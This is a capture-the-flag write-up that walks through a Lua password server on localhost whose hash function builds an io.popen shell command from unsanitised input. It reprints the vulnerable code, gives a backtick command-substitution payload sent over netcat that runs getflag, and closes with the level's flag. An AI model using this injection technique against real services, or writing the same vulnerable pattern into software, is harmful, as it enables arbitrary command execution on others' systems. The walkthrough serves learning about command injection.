# Exploit io.open Vulnerability
We have a lua script, which we will decorticate together.
```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()
  data = string.sub(data, 1, 40)
  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

This Lua program is a server that listens on the IP address `127.0.0.1` and port **`5151`**. Here is what it does:

1. It creates a server, which listens on the IP address `127.0.0.1` and port **`5151`**.
2. Once the client is connected, the server waits to receive a password string from the client.
3. The server calculates the SHA-1 hash of the received string using the system command **sha1sum** & returns the output content by applying a **`substr()`**.
4. It compares whether the hash corresponds to `f05d1d066fb246efe0c6f7d095f909a7a0cf34a0`,  in both cases it shows us nonsense.

Let’s reverse the hash we use to compare.

![enter image description here](https://i.imgur.com/fmxht0j.png)

If you pay a little attention, you will notice that this line is easily exploitable.
```c
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

Injected code to exploit the above line :
```bash
1) nc localhost 5151 # Connect to the server
2) `getflag > /tmp/ToEasy` # Send a substitution command
```

> Flag : `fa6v5ateaw21peobuub8ipe6s`
